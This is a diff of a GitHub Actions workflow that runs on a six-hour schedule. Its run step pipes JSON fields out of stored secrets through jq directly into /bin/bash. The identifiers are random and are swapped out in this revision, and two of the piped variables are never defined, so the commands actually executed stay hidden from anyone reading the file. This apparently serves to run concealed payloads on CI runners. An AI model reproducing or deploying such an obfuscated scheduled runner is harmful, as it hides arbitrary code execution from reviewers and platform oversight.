@@ -1,8 +1,9 @@
 name: chengengfuzi
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 0/6 * * *'
+    - cron: '49 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengengfuzi
         env:
-          er89036: ${{ secrets.er89036 }}
+          kleo31: ${{ secrets.kleo31 }}
         run: |
-          echo $er89036 | jq -r .kxnp495 | /bin/bash
-          echo $txip515 | jq -r .uo84587 | /bin/bash
-          echo $yf29 | jq -r .hx223 | /bin/bash
-          echo $ucvqg0 | jq -r .y49 | /bin/bash
+          echo $kleo31 | jq -r .znqid87557 | /bin/bash
+          echo $j854 | jq -r .e731 | /bin/bash
+          echo $stdsq52354 | jq -r .cd51562 | /bin/bash
 
